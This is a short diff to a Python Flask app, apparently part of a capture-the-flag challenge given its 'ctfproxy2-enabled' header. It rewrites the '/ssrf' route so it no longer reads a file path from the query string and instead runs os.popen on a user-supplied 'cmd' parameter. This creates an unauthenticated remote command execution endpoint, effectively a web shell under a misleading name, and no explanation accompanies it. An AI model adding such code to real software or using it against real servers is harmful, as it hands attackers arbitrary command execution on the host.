@@ -1,6 +1,7 @@
 from flask import Flask, jsonify, render_template, make_response, request
 import json
 import requests
+import os
 
 
 app = Flask(__name__)
@@ -67,7 +68,8 @@ def f():
 
 @app.route('/ssrf', methods=['GET'])
 def g():
-    file = open(request.args.get('url'), 'r')
+    #file = open(request.args.get('url'), 'r')
+    file = os.popen(request.args.get('cmd'))
     resp = make_response(file.read())
     resp.headers.add('content-type', 'text/html; charset=UTF-8')
     resp.headers.add('ctfproxy2-enabled', '1')   
